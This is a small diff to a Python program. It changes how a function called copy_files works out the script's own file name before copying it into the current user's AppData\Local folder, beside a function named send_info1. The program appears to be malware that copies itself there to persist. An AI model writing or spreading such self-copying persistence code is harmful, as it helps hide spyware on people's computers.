@@ -153,12 +153,9 @@ def send_info1(time_wait, data):
 def copy_files():
 	print("Copying files")
 	username = psutil.users()[0][0]
-
+	name = os.path.basename(sys.argv[0])
 	fileName = sys.argv[0]
-	if fileName[-1] == "e":
-		name = "foren6.exe"
-	else:
-		name = "foren6.py"
+
 
 	
 	a = glob.glob(f"C:\Users\{username}\AppData\Local")
